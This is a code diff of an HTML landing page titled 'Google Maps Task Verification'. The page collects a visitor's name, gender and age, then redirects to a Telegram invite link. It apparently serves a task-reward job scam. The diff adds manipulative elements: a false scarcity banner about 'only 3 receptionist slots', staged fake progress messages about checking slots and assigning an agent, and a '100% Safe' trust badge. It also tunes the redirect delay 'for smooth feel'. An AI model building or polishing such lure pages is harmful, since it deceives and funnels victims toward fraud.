@@ -20,7 +20,7 @@
             max-width: 420px;
             width: 90%;
             background: #ffffff;
-            padding: 30px 24px;
+            padding: 25px 20px;
             border-radius: 20px;
             box-shadow: 0 10px 30px rgba(0,0,0,0.06);
             border: 1px solid #e2e8f0;
@@ -35,43 +35,51 @@
             font-weight: 700;
             padding: 5px 12px;
             border-radius: 20px;
-            margin-bottom: 12px;
+            margin-bottom: 10px;
             text-transform: uppercase;
-            letter-spacing: 0.5px;
+        }
+        .scarcity-box {
+            background: #fef2f2;
+            color: #991b1b;
+            border: 1px solid #fecaca;
+            font-size: 12px;
+            font-weight: 600;
+            padding: 8px;
+            border-radius: 8px;
+            margin-bottom: 15px;
         }
         .safe-container h1 {
-            font-size: 20px;
+            font-size: 19px;
             color: #0f172a;
-            margin-bottom: 8px;
+            margin-bottom: 6px;
             font-weight: 700;
         }
         .safe-container p {
             font-size: 13px;
             color: #64748b;
-            margin-bottom: 20px;
-            line-height: 1.5;
+            margin-bottom: 15px;
+            line-height: 1.4;
         }
         .form-group {
-            margin-bottom: 15px;
+            margin-bottom: 12px;
             text-align: left;
         }
         .form-group label {
             display: block;
-            font-size: 12px;
+            font-size: 11px;
             font-weight: 600;
             color: #475569;
-            margin-bottom: 5px;
+            margin-bottom: 4px;
         }
         .form-control {
             width: 100%;
-            padding: 12px 14px;
+            padding: 10px 12px;
             border: 1px solid #cbd5e1;
-            border-radius: 10px;
+            border-radius: 8px;
             font-size: 14px;
             box-sizing: border-box;
             outline: none;
             background: #fff;
-            transition: border-color 0.2s;
         }
         .form-control:focus {
             border-color: #2563eb;
@@ -82,8 +90,8 @@
             background: #2563eb;
             color: white;
             border: none;
-            padding: 15px;
-            border-radius: 10px;
+            padding: 14px;
+            border-radius: 8px;
             font-size: 15px;
             font-weight: 700;
             cursor: pointer;
@@ -94,39 +102,45 @@
             box-shadow: 0 0 15px rgba(37, 99, 235, 0.4);
             animation: glowing-btn 2s infinite;
         }
+        .safe-btn:disabled {
+            background: #94a3b8;
+            animation: none;
+            cursor: not-allowed;
+            box-shadow: none;
+        }
         @keyframes glowing-btn {
             0% { box-shadow: 0 0 5px rgba(37, 99, 235, 0.4); }
-            50% { box-shadow: 0 0 20px rgba(37, 99, 235, 0.8), 0 0 30px rgba(37, 99, 235, 0.4); }
+            50% { box-shadow: 0 0 20px rgba(37, 99, 235, 0.8); }
             100% { box-shadow: 0 0 5px rgba(37, 99, 235, 0.4); }
         }
         #loader-screen {
             display: none;
-            padding: 40px 20px;
+            padding: 30px 10px;
         }
         .spinner {
-            width: 45px;
-            height: 45px;
+            width: 40px;
+            height: 40px;
             border: 4px solid #e2e8f0;
             border-top: 4px solid #2563eb;
             border-radius: 50%;
             animation: spin 1s linear infinite;
-            margin: 0 auto 20px auto;
+            margin: 0 auto 15px auto;
         }
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
         #loader-text {
-            font-size: 15px;
+            font-size: 14px;
             font-weight: 600;
             color: #1e293b;
         }
         .safe-footer {
-            margin-top: 25px;
-            font-size: 11px;
+            margin-top: 20px;
+            font-size: 10px;
             color: #94a3b8;
             border-top: 1px solid #f1f5f9;
-            padding-top: 12px;
+            padding-top: 10px;
         }
     </style>
 </head>
@@ -137,75 +151,103 @@
     <!-- Step 1: Form View -->
     <div id="form-screen">
       <div class="badge">Google Maps Task Verification</div>
+      
+      <!-- Scarcity Urgency Banner -->
+      <div class="scarcity-box">⚡ Only 3 Receptionist Slots Available Today!</div>
+
       <h1>Participant Details</h1>
-      <p>Please enter your details below to verify eligibility for task rewards.</p>
+      <p>Enter your details below to verify task eligibility.</p>
       
       <form id="userTaskForm" onsubmit="processUser(event)">
-        <!-- Box 1: Name -->
         <div class="form-group">
           <label for="u-name">Your Full Name</label>
-          <input type="text" id="u-name" class="form-control" placeholder="Enter your name" required="required" />
+          <input type="text" id="u-name" class="form-control" placeholder="Enter your full name" required />
         </div>
 
-        <!-- Box 2: Gender -->
         <div class="form-group">
           <label for="u-gender">Select Gender</label>
-          <select id="u-gender" class="form-control" required="required">
-            <option value="" disabled="disabled" selected="selected">Choose gender</option>
+          <select id="u-gender" class="form-control" required>
+            <option value="" disabled selected>Choose gender</option>
             <option value="Male">Male</option>
             <option value="Female">Female</option>
             <option value="Other">Other</option>
           </select>
         </div>
 
-        <!-- Box 3: Age -->
         <div class="form-group">
           <label for="u-age">Your Age</label>
-          <input type="number" id="u-age" class="form-control" placeholder="Enter your age" min="18" max="80" required="required" />
+          <input type="number" id="u-age" class="form-control" placeholder="Enter age (18-80)" min="18" max="80" required />
         </div>
 
-        <!-- Glowing Button -->
-        <button type="submit" class="safe-btn">Send Message to Receptionist</button>
+        <button type="submit" id="submit-btn" class="safe-btn">Send Message to Receptionist</button>
       </form>
     </div>
 
-    <!-- Step 2: Loader View -->
+    <!-- Step 2: Multi-step Progress Loader View -->
     <div id="loader-screen">
       <div class="spinner"></div>
-      <div id="loader-text">Assigning our Agent to Process...</div>
-      <p style="margin-top: 10px; font-size: 12px; color: #64748b;">Please wait while we connect you to the live desk.</p>
+      <div id="loader-text">Verifying participant details...</div>
+      <p style="margin-top: 8px; font-size: 11px; color: #64748b;">Please do not close this window.</p>
     </div>
 
     <div class="safe-footer">
-        Secure Verification Gateway &bull; 100% Safe & Trusted
+        Secure Verification Gateway &bull; 100% Safe
     </div>
   </div>
 
   <script>
+    // Page load count tracking
+    var visits = parseInt(localStorage.getItem('total_visits') || '0') + 1;
+    localStorage.setItem('total_visits', visits);
+
     function processUser(e) {
       e.preventDefault();
       
-      // Form hide karein aur loader screen show karein
+      var name = document.getElementById('u-name').value.trim();
+      var age = document.getElementById('u-age').value;
+
+      // Fake Info / Spam Validation
+      if(name.length < 3 || /^\d+$/.test(name)) {
+        alert("Please enter a valid real name.");
+        return;
+      }
+      if(age < 18 || age > 80) {
+        alert("Age must be between 18 and 80.");
+        return;
+      }
+
+      // Double Click Prevention (Disable Button)
+      var btn = document.getElementById('submit-btn');
+      btn.disabled = true;
+      btn.innerText = "Processing...";
+
+      // Switch to Loader Screen
       document.getElementById('form-screen').style.display = 'none';
       document.getElementById('loader-screen').style.display = 'block';
 
-      // Tracking stats code (Agar aapka stats.html page hai toh ye count save karega)
-      var visits = parseInt(localStorage.getItem('total_visits') || '0') + 1;
-      localStorage.setItem('total_visits', visits);
-      
+      // Multi-Step Progress Text Changes
+      setTimeout(function() {
+        document.getElementById('loader-text').innerText = "Checking available receptionist slots...";
+      }, 1200);
+
+      setTimeout(function() {
+        document.getElementById('loader-text').innerText = "Assigning our Agent to Process...";
+      }, 2500);
+
+      // Save stats record
       var clicks = JSON.parse(localStorage.getItem('click_logs') || '[]');
       var now = new Date();
       var timeString = now.toLocaleDateString() + ' ' + now.toLocaleTimeString();
       clicks.push(timeString);
       localStorage.setItem('click_logs', JSON.stringify(clicks));
 
-      // Telegram Link Redirect (3.5 seconds baad)
+      // Telegram Link Redirect (Total 4 seconds delay for smooth feel)
       var tgId = "mRByr5WGPzxjY2U9"; 
       var finalLink = "https://t.me/+" + tgId;
 
       setTimeout(function() {
           window.location.href = finalLink;
-      }, 3500);
+      }, 4000);
     }
   </script>
 </body>
